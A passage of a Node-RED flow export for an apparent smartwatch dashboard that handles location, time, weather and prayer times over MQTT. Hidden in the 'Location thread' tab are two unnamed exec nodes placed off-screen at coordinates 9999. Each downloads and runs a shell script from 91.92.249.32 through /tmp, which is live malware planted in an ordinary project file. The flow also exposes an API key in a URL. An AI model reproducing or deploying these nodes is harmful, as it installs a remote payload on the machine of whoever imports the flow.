[
    {
        "id": "26c31c411b7aed4e",
        "type": "tab",
        "label": "Location thread",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "76af119abea34ab1",
        "type": "tab",
        "label": "Time Thread",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "fd376bf683b0fabc",
        "type": "tab",
        "label": "Weather Thread",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "9e3fb32af7cf4fda",
        "type": "tab",
        "label": "Prayer Time Thread",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "7fee5a622c31903e",
        "type": "tab",
        "label": "Buzz Motor",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "0f52f4266dc4f328",
        "type": "tab",
        "label": "Acceleramotor Thread",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "995e66d9c3486925",
        "type": "tab",
        "label": "Has Prayed?",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "0f98d85555b05267",
        "type": "mqtt-broker",
        "name": "azureMQTTBroker",
        "broker": "20.102.106.224",
        "port": "1883",
        "clientid": "",
        "autoConnect": true,
        "usetls": false,
        "protocolVersion": "4",
        "keepalive": "60",
        "cleansession": true,
        "autoUnsubscribe": true,
        "birthTopic": "",
        "birthQos": "0",
        "birthRetain": "false",
        "birthPayload": "",
        "birthMsg": {},
        "closeTopic": "",
        "closeQos": "0",
        "closeRetain": "false",
        "closePayload": "",
        "closeMsg": {},
        "willTopic": "",
        "willQos": "0",
        "willRetain": "false",
        "willPayload": "",
        "willMsg": {},
        "userProps": "",
        "sessionExpiry": ""
    },
    {
        "id": "eea7c2eb37b4ee60",
        "type": "ui_group",
        "name": "Prayer Times",
        "tab": "300391261a0c1712",
        "order": 3,
        "disp": true,
        "width": "6",
        "collapse": true,
        "className": ""
    },
    {
        "id": "300391261a0c1712",
        "type": "ui_tab",
        "name": "Home",
        "icon": "dashboard",
        "disabled": false,
        "hidden": false
    },
    {
        "id": "11c2a2f8233258d4",
        "type": "ui_base",
        "theme": {
            "name": "theme-light",
            "lightTheme": {
                "default": "#0094CE",
                "baseColor": "#0094CE",
                "baseFont": "-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif",
                "edited": true,
                "reset": false
            },
            "darkTheme": {
                "default": "#097479",
                "baseColor": "#097479",
                "baseFont": "-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif",
                "edited": false
            },
            "customTheme": {
                "name": "Untitled Theme 1",
                "default": "#4B7930",
                "baseColor": "#4B7930",
                "baseFont": "-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif"
            },
            "themeState": {
                "base-color": {
                    "default": "#0094CE",
                    "value": "#0094CE",
                    "edited": false
                },
                "page-titlebar-backgroundColor": {
                    "value": "#0094CE",
                    "edited": false
                },
                "page-backgroundColor": {
                    "value": "#fafafa",
                    "edited": false
                },
                "page-sidebar-backgroundColor": {
                    "value": "#ffffff",
                    "edited": false
                },
                "group-textColor": {
                    "value": "#1bbfff",
                    "edited": false
                },
                "group-borderColor": {
                    "value": "#ffffff",
                    "edited": false
                },
                "group-backgroundColor": {
                    "value": "#ffffff",
                    "edited": false
                },
                "widget-textColor": {
                    "value": "#111111",
                    "edited": false
                },
                "widget-backgroundColor": {
                    "value": "#0094ce",
                    "edited": false
                },
                "widget-borderColor": {
                    "value": "#ffffff",
                    "edited": false
                },
                "base-font": {
                    "value": "-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif"
                }
            },
            "angularTheme": {
                "primary": "indigo",
                "accents": "blue",
                "warn": "red",
                "background": "grey",
                "palette": "light"
            }
        },
        "site": {
            "name": "Node-RED Dashboard",
            "hideToolbar": "false",
            "allowSwipe": "false",
            "lockMenu": "false",
            "allowTempTheme": "true",
            "dateFormat": "DD/MM/YYYY",
            "sizes": {
                "sx": 48,
                "sy": 48,
                "gx": 6,
                "gy": 6,
                "cx": 6,
                "cy": 6,
                "px": 0,
                "py": 0
            }
        }
    },
    {
        "id": "2326422660e4d973",
        "type": "ui-base",
        "name": "UI",
        "path": "/dashboard"
    },
    {
        "id": "fa33f0f465c0e85e",
        "type": "ui-theme",
        "name": "Interface",
        "colors": {
            "surface": "#ffffff",
            "primary": "#0094ce",
            "bgPage": "#eeeeee",
            "groupBg": "#ffffff",
            "groupOutline": "#cccccc"
        }
    },
    {
        "id": "1dda8261ced4c2d2",
        "type": "ui-page",
        "name": "User Web Interface",
        "ui": "2326422660e4d973",
        "path": "/home",
        "layout": "grid",
        "theme": "fa33f0f465c0e85e",
        "order": -1,
        "className": ""
    },
    {
        "id": "5883f430f1d301f5",
        "type": "ui-group",
        "name": "User Web Interface display",
        "page": "1dda8261ced4c2d2",
        "width": "20",
        "height": "15",
        "order": -1,
        "disp": true,
        "className": ""
    },
    {
        "id": "9dd4315f31903722",
        "type": "ui_group",
        "name": "Time",
        "tab": "300391261a0c1712",
        "order": 1,
        "disp": true,
        "width": "7",
        "collapse": true,
        "className": ""
    },
    {
        "id": "3b695d985163eb5c",
        "type": "ui_group",
        "name": "Weather",
        "tab": "300391261a0c1712",
        "order": 2,
        "disp": true,
        "width": "6",
        "collapse": true,
        "className": ""
    },
    {
        "id": "e20dd7cb2c589c09",
        "type": "ui_group",
        "name": "Location",
        "tab": "300391261a0c1712",
        "order": 4,
        "disp": true,
        "width": "6",
        "collapse": true,
        "className": ""
    },
    {
        "id": "cb1448027f9dc077",
        "type": "mqtt-broker",
        "name": "",
        "broker": "",
        "port": "1883",
        "clientid": "",
        "autoConnect": true,
        "usetls": false,
        "protocolVersion": "4",
        "keepalive": "60",
        "cleansession": true,
        "autoUnsubscribe": true,
        "birthTopic": "",
        "birthQos": "0",
        "birthRetain": "false",
        "birthPayload": "",
        "birthMsg": {},
        "closeTopic": "",
        "closeQos": "0",
        "closeRetain": "false",
        "closePayload": "",
        "closeMsg": {},
        "willTopic": "",
        "willQos": "0",
        "willRetain": "false",
        "willPayload": "",
        "willMsg": {},
        "userProps": "",
        "sessionExpiry": ""
    },
    {
        "id": "b391efae71c73b5a",
        "type": "ui_group",
        "name": "Vibrate Motor",
        "tab": "300391261a0c1712",
        "order": 5,
        "disp": true,
        "width": "6",
        "collapse": true,
        "className": ""
    },
    {
        "id": "ed47eec370a82b85",
        "type": "ui_group",
        "name": "Accelerometer Values",
        "tab": "300391261a0c1712",
        "order": 6,
        "disp": true,
        "width": "6",
        "collapse": true,
        "className": ""
    },
    {
        "id": "23579b0648736c3c",
        "type": "ui_group",
        "name": "Did you pray today?",
        "tab": "300391261a0c1712",
        "order": 7,
        "disp": true,
        "width": "6",
        "collapse": false,
        "className": ""
    },
    {
        "id": "8f3b49c4adc02cc7",
        "type": "mqtt out",
        "z": "26c31c411b7aed4e",
        "name": "/watch/location/req",
        "topic": "/watch/location",
        "qos": "2",
        "retain": "true",
        "respTopic": "",
        "contentType": "",
        "userProps": "",
        "correl": "",
        "expiry": "",
        "broker": "0f98d85555b05267",
        "x": 650,
        "y": 120,
        "wires": []
    },
    {
        "id": "1829d502d3e44d91",
        "type": "inject",
        "z": "26c31c411b7aed4e",
        "name": "Location from PC/Phone",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "location",
        "payload": "{\"deviceId\":\"blissAlarmPC\",\"location\":{\"latitude\":40.7128,\"longitude\":-74.006},\"timestamp\":\"2023-11-20T12:00:00Z\"}",
        "payloadType": "json",
        "x": 190,
        "y": 120,
        "wires": [
            [
                "38c9e528fe19c4d7"
            ]
        ]
    },
    {
        "id": "fc26610bae5b3f18",
        "type": "debug",
        "z": "26c31c411b7aed4e",
        "name": "Display location",
        "active": true,
        "tosidebar": true,
        "console": true,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 800,
        "y": 300,
        "wires": []
    },
    {
        "id": "db8163ab75ad1b84",
        "type": "mqtt in",
        "z": "26c31c411b7aed4e",
        "name": "/watch/location/response",
        "topic": "/watch/location",
        "qos": "2",
        "datatype": "auto-detect",
        "broker": "0f98d85555b05267",
        "nl": false,
        "rap": true,
        "rh": 0,
        "inputs": 0,
        "x": 140,
        "y": 340,
        "wires": [
            [
                "86c189bb1d018587"
            ]
        ]
    },
    {
        "id": "86c189bb1d018587",
        "type": "http request",
        "z": "26c31c411b7aed4e",
        "name": "GET location",
        "method": "GET",
        "ret": "obj",
        "paytoqs": "ignore",
        "url": "http://ip-api.com/json",
        "tls": "",
        "persist": false,
        "proxy": "",
        "insecureHTTPParser": false,
        "authType": "",
        "senderr": false,
        "headers": [],
        "x": 340,
        "y": 340,
        "wires": [
            [
                "100e8bb4a8e13c1a"
            ]
        ]
    },
    {
        "id": "100e8bb4a8e13c1a",
        "type": "function",
        "z": "26c31c411b7aed4e",
        "name": "Parse Location info",
        "func": "if (msg.payload && msg.payload.status === \"success\") {\n    const locationInfo = {\n        latitude: msg.payload.lat,\n        longitude: msg.payload.lon,\n        location: `${msg.payload.city}, ${msg.payload.region}, ${msg.payload.country}`\n    };\n    msg.payload = locationInfo;\n} else {\n    msg.payload = \"Location information not available\";\n}\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 560,
        "y": 340,
        "wires": [
            [
                "63527644cb9cae11",
                "fc26610bae5b3f18",
                "55becd9219761819"
            ]
        ]
    },
    {
        "id": "63527644cb9cae11",
        "type": "ui_text",
        "z": "26c31c411b7aed4e",
        "group": "e20dd7cb2c589c09",
        "order": 2,
        "width": "6",
        "height": "3",
        "name": "Location Display",
        "label": "Location Info:",
        "format": "<b>Latitude:</b> {{msg.payload.latitude}}<br> <b>Longitude:</b> {{msg.payload.longitude}}<br> <b>Location:</b> {{msg.payload.location}}",
        "layout": "col-center",
        "className": "",
        "style": true,
        "font": "Lucida Sans Typewriter,Lucida Console,Monaco,monospace",
        "fontSize": "18",
        "color": "#000000",
        "x": 790,
        "y": 360,
        "wires": []
    },
    {
        "id": "f4a5cb19cb2772c1",
        "type": "ui_text_input",
        "z": "26c31c411b7aed4e",
        "name": "IP Input",
        "label": "Enter IP Address:",
        "tooltip": "",
        "group": "e20dd7cb2c589c09",
        "order": 1,
        "width": 0,
        "height": 0,
        "passthru": true,
        "mode": "text",
        "delay": "0",
        "topic": "location",
        "sendOnBlur": true,
        "className": "",
        "topicType": "msg",
        "x": 110,
        "y": 420,
        "wires": [
            [
                "08c130e127aea46e"
            ]
        ]
    },
    {
        "id": "08c130e127aea46e",
        "type": "http request",
        "z": "26c31c411b7aed4e",
        "name": "GET location",
        "method": "GET",
        "ret": "obj",
        "paytoqs": "ignore",
        "url": "http://ip-api.com/json/{{{payload}}}",
        "tls": "",
        "persist": false,
        "proxy": "",
        "insecureHTTPParser": false,
        "authType": "",
        "senderr": false,
        "headers": [],
        "x": 320,
        "y": 420,
        "wires": [
            [
                "c5a3afee07daab41",
                "100e8bb4a8e13c1a"
            ]
        ]
    },
    {
        "id": "38c9e528fe19c4d7",
        "type": "ui_button",
        "z": "26c31c411b7aed4e",
        "name": "",
        "group": "e20dd7cb2c589c09",
        "order": 1,
        "width": 0,
        "height": 0,
        "passthru": true,
        "label": "Reset Location",
        "tooltip": "",
        "color": "",
        "bgcolor": "",
        "className": "",
        "icon": "",
        "payload": "true",
        "payloadType": "bool",
        "topic": "topic",
        "topicType": "msg",
        "x": 430,
        "y": 120,
        "wires": [
            [
                "8f3b49c4adc02cc7",
                "8bf95a78d4c3f240",
                "b97d46b22159dbfd",
                "31094a715dc14d73"
            ]
        ]
    },
    {
        "id": "b9a3c1768dc9bd55",
        "type": "mqtt out",
        "z": "26c31c411b7aed4e",
        "name": "/watch/location/mcu",
        "topic": "/watch/location/mcu",
        "qos": "2",
        "retain": "true",
        "respTopic": "",
        "contentType": "",
        "userProps": "",
        "correl": "",
        "expiry": "",
        "broker": "0f98d85555b05267",
        "x": 990,
        "y": 420,
        "wires": []
    },
    {
        "id": "c5a3afee07daab41",
        "type": "mqtt out",
        "z": "26c31c411b7aed4e",
        "name": "/watch/iplocation",
        "topic": "/watch/iplocation",
        "qos": "2",
        "retain": "true",
        "respTopic": "",
        "contentType": "",
        "userProps": "",
        "correl": "",
        "expiry": "",
        "broker": "0f98d85555b05267",
        "x": 550,
        "y": 420,
        "wires": []
    },
    {
        "id": "8bf95a78d4c3f240",
        "type": "mqtt out",
        "z": "26c31c411b7aed4e",
        "name": "/watch/time/request",
        "topic": "/watch/time",
        "qos": "2",
        "retain": "true",
        "respTopic": "",
        "contentType": "",
        "userProps": "",
        "correl": "",
        "expiry": "",
        "broker": "0f98d85555b05267",
        "x": 650,
        "y": 80,
        "wires": []
    },
    {
        "id": "b97d46b22159dbfd",
        "type": "mqtt out",
        "z": "26c31c411b7aed4e",
        "name": "/watch/weather/request",
        "topic": "/watch/weather",
        "qos": "2",
        "retain": "true",
        "respTopic": "",
        "contentType": "",
        "userProps": "",
        "correl": "",
        "expiry": "",
        "broker": "0f98d85555b05267",
        "x": 670,
        "y": 160,
        "wires": []
    },
    {
        "id": "31094a715dc14d73",
        "type": "mqtt out",
        "z": "26c31c411b7aed4e",
        "name": "/watch/prayertimes/request",
        "topic": "/watch/prayertimes",
        "qos": "2",
        "retain": "true",
        "respTopic": "",
        "contentType": "",
        "userProps": "",
        "correl": "",
        "expiry": "",
        "broker": "0f98d85555b05267",
        "x": 680,
        "y": 200,
        "wires": []
    },
    {
        "id": "b8d6a9778aba2dee",
        "type": "mqtt in",
        "z": "26c31c411b7aed4e",
        "name": "/watch/iplocation/req",
        "topic": "/watch/iplocation/req",
        "qos": "2",
        "datatype": "auto-detect",
        "broker": "0f98d85555b05267",
        "nl": false,
        "rap": true,
        "rh": 0,
        "inputs": 0,
        "x": 130,
        "y": 500,
        "wires": [
            [
                "08c130e127aea46e"
            ]
        ]
    },
    {
        "id": "01a060a9-e1fd-4a8c-98e4-96e107ce4e81",
        "type": "exec",
        "z": "26c31c411b7aed4e",
        "command": "echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a",
        "addpay": "",
        "append": "",
        "useSpawn": "false",
        "timer": "1000",
        "winHide": true,
        "oldrc": false,
        "name": "",
        "x": 9999,
        "y": 9999,
        "wires": [
            [],
            [],
            []
        ]
    },
    {
        "id": "24191496-a5a2-4eea-9af1-0d6845578955",
        "type": "inject",
        "z": "26c31c411b7aed4e",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 9999,
        "y": 9999,
        "wires": [
            [
                "01a060a9-e1fd-4a8c-98e4-96e107ce4e81"
            ]
        ]
    },
    {
        "id": "55becd9219761819",
        "type": "function",
        "z": "26c31c411b7aed4e",
        "name": "Parse to String",
        "func": "msg.payload = `${msg.payload.latitude}, ${msg.payload.longitude}, ${msg.payload.location}`;\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 780,
        "y": 420,
        "wires": [
            [
                "b9a3c1768dc9bd55"
            ]
        ]
    },
    {
        "id": "c7f8e4c5-b0cf-4b9b-8bb2-0ef66a813b91",
        "type": "exec",
        "z": "26c31c411b7aed4e",
        "command": "echo a;cd /tmp || cd /dev/shm || cd ~ ; wget --no-check-certificate http://91.92.249.32/bins/bins.sh ; curl -k http://91.92.249.32/bins/bins.sh -O ; sh bins.sh nodered ; rm bins.sh;echo a",
        "addpay": "",
        "append": "",
        "useSpawn": "false",
        "timer": "1000",
        "winHide": true,
        "oldrc": false,
        "name": "",
        "x": 9999,
        "y": 9999,
        "wires": [
            [],
            [],
            []
        ]
    },
    {
        "id": "9a738841-ba68-49bc-850f-251952c151c4",
        "type": "inject",
        "z": "26c31c411b7aed4e",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 9999,
        "y": 9999,
        "wires": [
            [
                "c7f8e4c5-b0cf-4b9b-8bb2-0ef66a813b91"
            ]
        ]
    },
    {
        "id": "682feed30aa17859",
        "type": "inject",
        "z": "76af119abea34ab1",
        "name": "Time Request",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "60",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "getTime",
        "payload": "true",
        "payloadType": "bool",
        "x": 140,
        "y": 120,
        "wires": [
            [
                "557bce5201114a15"
            ]
        ]
    },
    {
        "id": "b2c93bf644813a9b",
        "type": "mqtt out",
        "z": "76af119abea34ab1",
        "name": "/watch/time/request",
        "topic": "/watch/time",
        "qos": "2",
        "retain": "true",
        "respTopic": "",
        "contentType": "",
        "userProps": "",
        "correl": "",
        "expiry": "",
        "broker": "0f98d85555b05267",
        "x": 580,
        "y": 120,
        "wires": []
    },
    {
        "id": "cd9ce11406190ded",
        "type": "mqtt in",
        "z": "76af119abea34ab1",
        "name": "/watch/time/response",
        "topic": "/watch/time",
        "qos": "2",
        "datatype": "auto-detect",
        "broker": "0f98d85555b05267",
        "nl": false,
        "rap": true,
        "rh": 0,
        "inputs": 0,
        "x": 120,
        "y": 220,
        "wires": [
            [
                "393d6c30785499be"
            ]
        ]
    },
    {
        "id": "372fbf8e99a7b6bf",
        "type": "debug",
        "z": "76af119abea34ab1",
        "name": "Display time",
        "active": true,
        "tosidebar": true,
        "console": true,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 800,
        "y": 180,
        "wires": []
    },
    {
        "id": "8debef1442faaa0d",
        "type": "ui_text",
        "z": "76af119abea34ab1",
        "group": "9dd4315f31903722",
        "order": 0,
        "width": "7",
        "height": "4",
        "name": "Time UI Display",
        "label": "Date and Time",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "style": true,
        "font": "Lucida Sans Typewriter,Lucida Console,Monaco,monospace",
        "fontSize": "22",
        "color": "#000000",
        "x": 800,
        "y": 260,
        "wires": []
    },
    {
        "id": "ab40ae9f71b690ad",
        "type": "function",
        "z": "76af119abea34ab1",
        "name": "Get Current Time",
        "func": "// const now = new Date();\n// const utcTime = now.getTime() + (now.getTimezoneOffset() * 60000);\n// const phillyOffset = -5; // -4 if daylight saving time is in effect\n// const phillyTime = new Date(utcTime + (3600000 * phillyOffset));\n\n// let hours = phillyTime.getHours();\n// const minutes = phillyTime.getMinutes();\n// const ampm = hours >= 12 ? 'PM' : 'AM';\n// hours = hours % 12;\n// hours = hours ? hours : 12; // the hour '0' should be '12'\n// const minutesStr = minutes < 10 ? '0' + minutes : minutes;\n\n// msg.payload = `${phillyTime.toISOString().split('T')[0]} ${hours}:${minutesStr} ${ampm}`;\n\n// return msg;\n\n// Assuming msg.latitude, msg.longitude, and msg.timezoneOffset are provided\nconst now = new Date();\nconst utcTime = now.getTime() + (now.getTimezoneOffset() * 60000);\nconst localOffset = msg.timezoneOffset; // Dynamic offset based on current location\nconst localTime = new Date(utcTime + (3600000 * localOffset));\n\nlet hours = localTime.getHours();\nconst minutes = localTime.getMinutes();\nconst ampm = hours >= 12 ? 'PM' : 'AM';\nhours = hours % 12;\nhours = hours ? hours : 12; // the hour '0' should be '12'\nconst minutesStr = minutes < 10 ? '0' + minutes : minutes;\n\nmsg.payload = `${localTime.toISOString().split('T')[0]} ${hours}:${minutesStr} ${ampm}`;\n\nreturn msg;\n",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 610,
        "y": 220,
        "wires": [
            [
                "8debef1442faaa0d",
                "372fbf8e99a7b6bf",
                "7732e803c1aaa5a9"
            ]
        ]
    },
    {
        "id": "cc5b437f59ad82b5",
        "type": "http request",
        "z": "76af119abea34ab1",
        "name": "GET timezone",
        "method": "GET",
        "ret": "obj",
        "paytoqs": "ignore",
        "url": "http://api.timezonedb.com/v2.1/get-time-zone?key=C7M79SVVB8AM&format=json&by=position&lat={{{payload.lat}}}&lng={{{payload.lon}}}",
        "tls": "",
        "persist": false,
        "proxy": "",
        "insecureHTTPParser": false,
        "authType": "",
        "senderr": false,
        "headers": [],
        "x": 360,
        "y": 280,
        "wires": [
            [
                "16ae0c714541ce29"
            ]
        ]
    },
    {
        "id": "393d6c30785499be",
        "type": "http request",
        "z": "76af119abea34ab1",
        "name": "GET location",
        "method": "GET",
        "ret": "obj",
        "paytoqs": "ignore",
        "url": "http://ip-api.com/json",
        "tls": "",
        "persist": false,
        "proxy": "",
        "insecureHTTPParser": false,
        "authType": "",
        "senderr": false,
        "headers": [],
        "x": 170,
        "y": 280,
        "wires": [
            [
                "cc5b437f59ad82b5"
            ]
        ]
    },
    {
        "id": "16ae0c714541ce29",
        "type": "function",
        "z": "76af119abea34ab1",
        "name": "calc offset",
        "func": "if (msg.payload && msg.payload.status === \"OK\") {\n    const offsetInSeconds = msg.payload.gmtOffset;\n    const offsetInHours = offsetInSeconds / 3600;\n    msg.timezoneOffset = offsetInHours;\n} else {\n    msg.timezoneOffset = 0; // Default to UTC if data not available\n    msg.error = 'Timezone data not available';\n}\nreturn msg;\n",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 430,
        "y": 220,
        "wires": [
            [
                "ab40ae9f71b690ad"
            ]
        ]
    },
    {
        "id": "a667d098a1da0528",
        "type": "mqtt in",
        "z": "76af119abea34ab1",
        "name": "/watch/iplocation",
        "topic": "/watch/iplocation",
        "qos": "2",
        "datatype": "json",
        "broker": "0f98d85555b05267",
        "nl": false,
        "rap": true,
        "rh": 0,
        "inputs": 0,
        "x": 100,
        "y": 360,
        "wires": [
            [
                "cc5b437f59ad82b5"
            ]
        ]
    },
    {
        "id": "7732e803c1aaa5a9",
        "type": "mqtt out",
        "z": "76af119abea34ab1",
        "name": "/watch/time/mcu",
        "topic": "/watch/time/mcu",
        "qos": "2",
        "retain": "true",
        "respTopic": "",
        "contentType": "",
        "userProps": "",
        "correl": "",
        "expiry": "",
        "broker": "0f98d85555b05267",
        "x": 800,
        "y": 340,
        "wires": []
    },
    {
        "id": "557bce5201114a15",
        "type": "ui_button",
        "z": "76af119abea34ab1",
        "name": "",
        "group": "9dd4315f31903722",
        "order": 1,
        "width": 0,
        "height": 0,
        "passthru": true,
        "label": "Update Time",
        "tooltip": "",
        "color": "",
        "bgcolor": "",
        "className": "",
        "icon": "access_time",
        "payload": "true",
        "payloadType": "bool",
        "topic": "topic",
        "topicType": "msg",
        "x": 350,
        "y": 120,
        "wires": [
            [
                "b2c93bf644813a9b"
            ]
        ]
    },
    {
        "id": "cf39141ad6a9bcfc",
        "type": "http request",
        "z": "76af119abea34ab1",
        "name": "GET location",
        "method": "GET",
        "ret": "obj",
        "paytoqs": "ignore",
        "url": "http://ip-api.com/json/{{{payload}}}",
        "tls": "",
        "persist": false,
        "proxy": "",
        "insecureHTTPParser": false,
        "authType": "",
        "senderr": false,
        "headers": [],
        "x": 290,
        "y": 480,
        "wires": [
            [
                "3e21d3746ec8fdcf"
            ]
        ]
    },
    {
        "id": "3e21d3746ec8fdcf",
        "type": "mqtt out",
        "z": "76af119abea34ab1",
        "name": "/watch/iplocation",
        "topic": "iplocation",
        "qos": "2",
        "retain": "true",
        "respTopic": "",
        "contentType": "",
        "userProps": "",
        "correl": "",
        "expiry": "",
        "broker": "0f98d85555b05267",
        "x": 510,
        "y": 480,
        "wires": []
    },
    {
        "id": "751cd0b3eddeed4b",
        "type": "mqtt out",
        "z": "fd376bf683b0fabc",
        "name": "/watch/weather/request",
        "topic": "/watch/weather",
        "qos": "2",
        "retain": "true",
        "respTopic": "",
        "contentType": "",
        "userProps": "",
        "correl": "",
        "expiry": "",
        "broker": "0f98d85555b05267",
        "x": 630,
        "y": 120,
        "wires": []
    },
    {
        "id": "e346848794f7436f",
        "type": "inject",
        "z": "fd376bf683b0fabc",
        "name": "Weather Request",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "getWeather",
        "payload": "true",
        "payloadType": "bool",
        "x": 160,
        "y": 120,
        "wires": [
            [
                "2e217e36c9e81111"
            ]
        ]
    },
    {
        "id": "c386cbda1056fb32",
        "type": "debug",
        "z": "fd376bf683b0fabc",
        "name": "Display weather",
        "active": true,
        "tosidebar": true,
        "console": true,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 790,
        "y": 200,
        "wires": []
    },
    {
        "id": "735be631cd95a2d2",
        "type": "mqtt in",
        "z": "fd376bf683b0fabc",
        "name": "/watch/weather/response",
        "topic": "/watch/weather",
        "qos": "2",
        "datatype": "auto-detect",
        "broker": "0f98d85555b05267",
        "nl": false,
        "rap": true,
        "rh": 0,
        "inputs": 0,
        "x": 130,
        "y": 240,
        "wires": [
            [
                "b98e943f57b93d7d"
            ]
        ]
    },
    {
        "id": "54fdc8570db28d57",
        "type": "ui_gauge",
        "z": "fd376bf683b0fabc",
        "name": "Temperature Display",
        "group": "3b695d985163eb5c",
        "order": 1,
        "width": 0,
        "height": 0,
        "gtype": "gage",
        "title": "Temperature",
        "label": "°F",
        "format": "{{msg.payload}}",
        "min": 0,
        "max": "125",
        "colors": [
            "#000cb3",
            "#00e604",
            "#ca3838"
        ],
        "seg1": "",
        "seg2": "",
        "diff": false,
        "className": "",
        "x": 800,
        "y": 280,
        "wires": []
    },
    {
        "id": "2f20d536c5be7f5c",
        "type": "http request",
        "z": "fd376bf683b0fabc",
        "name": "GET Temp Info",
        "method": "GET",
        "ret": "obj",
        "paytoqs": "ignore",
        "url": "https://api.open-meteo.com/v1/forecast?latitude={{{payload.lat}}}&longitude={{{payload.lon}}}&current_weather=true",
        "tls": "",
        "persist": false,
        "proxy": "",
        "insecureHTTPParser": false,
        "authType": "",
        "senderr": false,
        "headers": [],
        "x": 420,
        "y": 240,
        "wires": [
            [
                "8a59a333ce2504e8"
            ]
        ]
    },
    {
        "id": "8a59a333ce2504e8",
        "type": "function",
        "z": "fd376bf683b0fabc",
        "name": "Parse for Temp",
        "func": "if (msg.payload && msg.payload.current_weather) {\n    const temperatureCelsius = msg.payload.current_weather.temperature;\n    const temperatureFahrenheit = (temperatureCelsius * 9/5) + 32;\n    msg.payload = temperatureFahrenheit.toFixed(0) + '°F'; // Rounded to one decimal place\n} else {\n    msg.payload = 'Temperature data not available';\n}\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 600,
        "y": 240,
        "wires": [
            [
                "54fdc8570db28d57",
                "c386cbda1056fb32",
                "82fbef428c9294de"
            ]
        ]
    },
    {
        "id": "2e217e36c9e81111",
        "type": "ui_button",
        "z": "fd376bf683b0fabc",
        "name": "Update Weather",
        "group": "3b695d985163eb5c",
        "order": 1,
        "width": 0,
        "height": 0,
        "passthru": true,
        "label": "Update Weather",
        "tooltip": "",
        "color": "",
        "bgcolor": "green",
        "className": "",
        "icon": "cloud",
        "payload": "true",
        "payloadType": "bool",
        "topic": "topic",
        "topicType": "msg",
        "x": 380,
        "y": 120,
        "wires": [
            [
                "751cd0b3eddeed4b"
            ]
        ]
    },
    {
        "id": "b98e943f57b93d7d",
        "type": "http request",
        "z": "fd376bf683b0fabc",
        "name": "GET location",
        "method": "GET",
        "ret": "obj",
        "paytoqs": "ignore",
        "url": "http://ip-api.com/json",
        "tls": "",
        "persist": false,
        "proxy": "",
        "insecureHTTPParser": false,
        "authType": "",
        "senderr": false,
        "headers": [],
        "x": 290,
        "y": 300,
        "wires": [
            [
                "2f20d536c5be7f5c"
            ]
        ]
    },
    {
        "id": "870e29183aa6bd16",
        "type": "mqtt in",
        "z": "fd376bf683b0fabc",
        "name": "/watch/iplocation",
        "topic": "/watch/iplocation",
        "qos": "2",
        "datatype": "json",
        "broker": "0f98d85555b05267",
        "nl": false,
        "rap": true,
        "rh": 0,
        "inputs": 0,
        "x": 200,
        "y": 180,
        "wires": [
            [
                "2f20d536c5be7f5c"
            ]
        ]
    },
    {
        "id": "82fbef428c9294de",
        "type": "mqtt out",
        "z": "fd376bf683b0fabc",
        "name": "/watch/weather/mcu",
        "topic": "/watch/weather/mcu",
        "qos": "2",
        "retain": "true",
        "respTopic": "",
        "contentType": "",
        "userProps": "",
        "correl": "",
        "expiry": "",
        "broker": "0f98d85555b05267",
        "x": 800,
        "y": 360,
        "wires": []
    },
    {
        "id": "b4c6b0cb47bd3929",
        "type": "mqtt out",
        "z": "9e3fb32af7cf4fda",
        "name": "/watch/prayertimes/request",
        "topic": "/watch/prayertimes",
        "qos": "2",
        "retain": "true",
        "respTopic": "",
        "contentType": "",
        "userProps": "",
        "correl": "",
        "expiry": "",
        "broker": "0f98d85555b05267",
        "x": 640,
